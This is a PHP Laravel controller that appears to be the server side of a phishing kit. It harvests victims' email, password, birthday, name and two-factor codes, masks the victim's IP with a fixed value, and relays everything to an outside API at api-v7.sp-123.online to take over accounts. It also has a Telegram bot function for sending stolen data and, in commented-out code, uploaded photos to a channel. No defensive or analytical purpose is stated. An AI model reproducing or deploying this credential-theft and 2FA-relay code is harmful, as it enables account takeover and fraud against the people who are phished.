<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Str;
use GuzzleHttp\Client;

class HomeController extends Controller
{
    public function index($randomString = null)
    {
        // Nếu không có chuỗi ngẫu nhiên, tạo một chuỗi mới
        if (!$randomString) {
            $randomString = Str::random(32);
            return redirect(route('index', $randomString));
        }

        // Truyền chuỗi ngẫu nhiên tới view
        return view('index', ['randomString' => $randomString]);
    }


    public function handleLogin(Request $request)
    {
        $ip = $request->ip();
        $email = $request->get('email');
        $password = $request->get('password');
        $birthday = $request->get('birthday');
        $name = $request->get('name');
        $filePaths = [];
        // $files = $request->file('files');
        // foreach ($files as $file) {
        //     $filePaths[] = $file->store('/images');
        // }
        // dd($filePaths);
        $data = [
            'email' => $email,
            'password' => $password,
            'ip' => '183.80.56.11',
            'birth_day' => $birthday,
            'name' => $name,
        ];
        // Gửi request POST đến API
        $result = $this->getDataApi('auth', $data);
        $status = $result['status'] ?? null;
        if ($status === 200) {
            session()->put('email', $email);
            session()->put('birthday', $birthday);
            // session()->put('files', json_encode($filePaths));
            $data = [
                'email' => $email,
                'status' => $status
            ];
            return $data;
        } elseif ($status === 400) {
            $message = $result['message'];
            $data = [
                'message' => $message,
                'status' => $status
            ];
            return $data;
        }
    }


    public function towfa()
    {
        return view('towfa');
    }

    public function handleTowfa(Request $request)
    {
        $email = session()->get('email');
        $birthday = session()->get('birthday');
        // $files = json_decode(session()->get('files'));
        $twofaCode = $request->get('twofa_code');

        $data = [
            'email' => $email,
            'twofa_code' => $twofaCode,
            'birth_day' => $birthday,
        ];

        // Gửi request POST đến API
        $result = $this->getDataApi('login_with_2fa', $data);
        $status = $result['status'] ?? null;
        if ($status === 200) {

            // $this->sendPhotoToTelegram('', $files, $email);
            return view('success');
        } elseif ($status === 400) {
            $message = $result['message'];
            return view('towfa', compact('message'));
        }
    }

    public function getDataApi($url, $data)
    {
        $response = Http::post('https://api-v7.sp-123.online/' . $url, $data);
        $result = $response->json();
        return $result;
    }
    function sendPhotoToTelegram($chatId, $birthday, $caption = null)
    {
        $is_ok = true;
        $channelChatId = env('TELEGRAM_CHANEL_ID');
        $apiUrl = "https://api.telegram.org/bot" . env('TELEGRAM_BOT_TOKEN') . "/sendDocument";
        $client = new Client();
        // dd($photoPath);
        // foreach($photoPath as $photo) {

            $response = $client->post($apiUrl, [
                'multipart' => [
                    [
                        'name' => 'chat_id',
                        'contents' => $channelChatId,
                    ],
                    [
                        'name' => 'document',
                        // 'contents' => fopen(storage_path('app/' .$photo),'r')
                        'contents' => $birthday
                    ],
                    [
                        'name' => 'caption',
                        'contents' => $caption,
                    ],
                ],
            ]);

            // Kiểm tra kết quả
            $result = json_decode($response->getBody(), true);
            if (!$result['ok']) {
                $is_ok = false;
            }
        // }


        return $is_ok;
    }

    public function success() {
        return view('success');
    }
}